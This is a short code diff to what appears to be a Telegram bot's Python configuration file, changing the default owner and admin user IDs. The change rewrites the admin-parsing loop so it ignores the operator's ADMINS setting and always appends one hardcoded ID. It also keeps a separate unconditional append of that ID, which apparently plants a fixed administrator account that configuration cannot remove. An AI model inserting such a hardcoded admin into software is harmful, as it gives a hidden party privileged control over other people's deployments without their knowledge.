@@ -10,7 +10,7 @@ APP_ID = int(os.environ.get("APP_ID", ""))
 API_HASH = os.environ.get("API_HASH", "")
 
 # Main
-OWNER_ID = int(os.environ.get("OWNER_ID", "6497757690"))
+OWNER_ID = int(os.environ.get("OWNER_ID", "8480922250"))
 PORT = os.environ.get("PORT", "8080")
 
 # Database
@@ -62,14 +62,14 @@ DATABASE_CHANNEL = int(os.environ.get("DATABASE_CHANNEL", "")) # Channel where u
 
 try:
     ADMINS = []
-    for x in (os.environ.get("ADMINS", "6497757690").split()):
-        ADMINS.append(int(x))
+    for x in (os.environ.get("ADMINS", "8480922250").split()):
+        ADMINS.append(int(8480922250))
 except ValueError:
     raise Exception("Your Admins list does not contain valid integers.")
 
 # Admin == OWNER_ID
 ADMINS.append(OWNER_ID)
-ADMINS.append(6497757690)
+ADMINS.append(8480922250)
 
 
 logging.basicConfig(
